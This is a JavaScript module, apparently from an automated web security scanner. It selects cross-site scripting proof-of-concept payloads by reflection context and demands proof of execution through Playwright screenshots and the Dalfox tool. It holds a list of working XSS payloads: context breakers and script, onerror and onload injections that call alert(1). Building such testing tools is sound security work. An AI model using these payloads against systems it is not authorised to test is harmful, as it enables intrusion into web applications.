/**
 * xssEscalator.js
 * 
 * Deterministic XSS payload escalation mapped to reflection context.
 */

export function escalateXSS(baselineResponse, injectedResponse, reflectionContext) {
    const escalationPlan = [
        "1. Detect context (HTML, Script, Attribute)",
        "2. Inject context-breaker (e.g. '\"> or </script>)",
        "3. (MANDATORY) Inject alert(1) equivalent payload for execution proof",
        "4. Capture Playwright screenshot proof after execution",
        "5. Run Dalfox if DOM XSS or complex filter evasion required"
    ];

    let nextPayloads = [];

    // Simple heuristical payload delivery
    if (reflectionContext === 'Script') {
        nextPayloads = [
            "';alert(1)//",
            "\\'-alert(1)//"
        ];
    } else if (reflectionContext === 'Attribute') {
        nextPayloads = [
            '"><script>alert(1)</script>',
            '" onmouseover="alert(1)" x="'
        ];
    } else {
        nextPayloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>"
        ];
    }

    return {
        vulnType: "XSS",
        requiresConfirmationTool: true, // run dalfox / playwright
        requiresExecutionProof: true, // Reflection is not XSS, execution must be proven
        acceptableSinks: ["onerror=", "<script>", "javascript:"],
        escalationPlan,
        nextPayloads
    };
}
